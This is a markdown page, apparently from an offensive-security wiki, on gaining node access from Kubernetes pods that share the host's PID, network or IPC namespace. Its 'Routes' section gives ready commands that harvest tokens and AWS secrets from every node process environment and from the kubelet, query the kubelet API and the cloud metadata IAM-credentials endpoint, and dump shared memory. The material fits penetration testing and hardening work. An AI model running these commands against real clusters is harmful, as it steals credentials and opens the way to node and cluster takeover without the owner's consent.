---
title: "Host namespaces: node reach from hostPID, hostNetwork, and hostIPC pods"
order: 3
description: "A pod with hostPID, hostNetwork, or hostIPC joins the node's corresponding namespace. hostPID exposes and lets you inject into node processes, hostNetwork reaches node-local services like the kubelet and cloud metadata, and hostIPC exposes node shared memory, each extending a pod toward node and cluster compromise."
keywords:
  - hostpid
  - hostnetwork
  - hostipc
  - kubernetes pod
  - node access
---

# Host namespaces

Setting `hostPID: true`, `hostNetwork: true`, or `hostIPC: true` on a pod joins it to the node's process, network, or IPC namespace. None is a direct root escape by itself, but each hands back a slice of the node that enables compromise, and they are the Kubernetes form of the runtime-agnostic shared-namespace escapes.

Detect which are set:

```bash
ls /proc | grep -qE '^[0-9]+$' && readlink /proc/1/exe   # node init => hostPID
ip addr; ss -tlnp 2>/dev/null | head                      # node interfaces/ports => hostNetwork
ipcs                                                      # node IPC objects => hostIPC
```

## Routes

```bash
# hostPID: harvest secrets from node process environments; inject with CAP_SYS_PTRACE
for p in /proc/[0-9]*; do tr '\0' '\n' < $p/environ 2>/dev/null; done | \
  grep -iE 'token|secret|kube|aws' | sort -u
cat /proc/<kubelet_pid>/environ | tr '\0' '\n' | grep -i token

# hostNetwork: reach the kubelet API and cloud metadata on the node
curl -sk https://127.0.0.1:10250/pods | head
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# hostIPC: read node shared memory of other processes
ipcs -m; cat /dev/shm/* 2>/dev/null
```

The hostNetwork route is the most directly rewarding: the kubelet read-write API on the node and the cloud metadata endpoint are both node-local services that a hostNetwork pod can reach, and each leads onward.

## Exploitation notes

- hostPID plus `CAP_SYS_PTRACE` allows injecting into a node root process; without ptrace it still leaks node process environments and the kubelet's own token.
- hostNetwork exposes the kubelet API ([Kubelet API](../exposed-components/kubelet-api.md)) and cloud metadata ([Cloud metadata from pod](../cluster-enumeration/cloud-metadata-from-pod.md)); both are high-value node-local targets.
- The underlying mechanics are the runtime-agnostic [Shared host namespaces](../../../container-escape/shared-host-namespaces/index.md).

## References

- [Kubernetes: pod security standards (host namespaces)](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [BishopFox: bad pods (host namespaces)](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation)
